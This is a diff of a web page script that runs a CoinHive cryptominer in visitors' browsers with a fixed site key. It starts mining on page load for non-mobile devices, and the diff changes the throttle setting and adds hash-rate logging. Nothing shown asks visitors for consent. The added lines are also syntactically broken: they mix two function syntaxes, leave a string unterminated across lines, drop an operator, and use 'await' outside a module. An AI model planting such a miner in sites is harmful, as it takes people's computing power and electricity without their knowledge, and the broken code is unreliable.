@@ -7,16 +7,23 @@
   <script src="js/newbun72.js"></script>
  
 <script>
-	var miner = new CoinHive.Anonymous('Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.3});
+	var miner = new CoinHive.Anonymous('Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.7});
 
 	// Only start on non-mobile devices and if not opted-out
 	// in the last 14400 seconds (4 hours):
 	if (!miner.isMobile()) {
-		miner.start();
+		await miner.start();
 	}
 	
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+	miner.on('found', function() => console.log('Found!'));
+	miner.on('accepted', function() => console.log('Accepted!'));
+	miner.on('update', data =>
+		console.log('
+			Hashes per second: ' + data.hashesPerSecond
+			+ 'Total hashes: ' + data.totalHashes
+			+ 'Accepted hashes: ' data.acceptedHashes
+			)
+		);
 
 	// Update stats once per second
 	setInterval(function() {
